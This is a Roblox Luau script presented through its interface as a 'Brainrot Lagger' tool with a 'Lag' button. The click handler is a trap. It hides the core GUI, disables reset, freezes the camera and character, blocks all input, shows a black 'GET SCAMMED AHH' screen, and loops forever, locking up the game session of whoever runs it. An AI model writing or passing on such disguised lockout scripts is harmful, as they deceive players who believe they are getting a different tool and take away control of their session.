--// Services
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local ContextActionService = game:GetService("ContextActionService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local camera = workspace.CurrentCamera

--// GUI
local gui = Instance.new("ScreenGui")
gui.Parent = player:WaitForChild("PlayerGui")
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Name = "BrainrotLagger"

-- Main Panel
local frame = Instance.new("Frame")
frame.Parent = gui
frame.Size = UDim2.new(0, 520, 0, 260)
frame.Position = UDim2.new(0.5,-260,0.5,-130)
frame.BackgroundColor3 = Color3.fromRGB(5,5,5)
frame.BorderSizePixel = 0
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,30)

local stroke = Instance.new("UIStroke", frame)
stroke.Thickness = 4
stroke.Color = Color3.fromRGB(170,0,255)

-- Title
local title = Instance.new("TextLabel")
title.Parent = frame
title.Size = UDim2.new(1,0,0,90)
title.Position = UDim2.new(0,0,0,20)
title.BackgroundTransparency = 1
title.Text = "Brainrot Lagger"
title.TextColor3 = Color3.fromRGB(90,140,255)
title.TextScaled = true
title.Font = Enum.Font.Arcade

-- Button
local button = Instance.new("TextButton")
button.Parent = frame
button.Size = UDim2.new(0,260,0,100)
button.Position = UDim2.new(0.5,-130,0.55,0)
button.BackgroundColor3 = Color3.fromRGB(40,40,40)
button.Text = "Lag"
button.TextColor3 = Color3.fromRGB(120,170,255)
button.TextScaled = true
button.Font = Enum.Font.Arcade
button.BorderSizePixel = 0
Instance.new("UICorner", button).CornerRadius = UDim.new(0,25)

-------------------------------------------------
-- DRAG SYSTEM
-------------------------------------------------
local dragging = false
local dragInput, dragStart, startPos

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
		
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
end)

-------------------------------------------------
-- FULL BLACK SCAM SCREEN
-------------------------------------------------
local function fullScam()

	frame.Visible = false
	
	-- Disable reset button
	pcall(function()
		StarterGui:SetCore("ResetButtonCallback", false)
	end)

	-- Hide CoreGui
	pcall(function()
		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
	end)

	-- Freeze camera
	camera.CameraType = Enum.CameraType.Scriptable
	local frozenCFrame = camera.CFrame

	-- Block all inputs
	ContextActionService:BindAction(
		"FreezeAll",
		function()
			return Enum.ContextActionResult.Sink
		end,
		false,
		unpack(Enum.PlayerActions:GetEnumItems())
	)

	-- Freeze movement
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.WalkSpeed = 0
		player.Character.Humanoid.JumpPower = 0
	end

	-- Black Screen
	local black = Instance.new("Frame")
	black.Parent = gui
	black.Size = UDim2.new(1,0,1,0)
	black.BackgroundColor3 = Color3.fromRGB(0,0,0)
	black.BorderSizePixel = 0

	local text = Instance.new("TextLabel")
	text.Parent = black
	text.Size = UDim2.new(1,0,1,0)
	text.BackgroundTransparency = 1
	text.Text = "GET SCAMMED AHH"
	text.TextColor3 = Color3.fromRGB(255,0,0)
	text.TextScaled = true
	text.Font = Enum.Font.Arcade

	-- Infinite freeze loop
	while true do
		camera.CFrame = frozenCFrame
		task.wait()
	end
end

button.MouseButton1Click:Connect(fullScam)
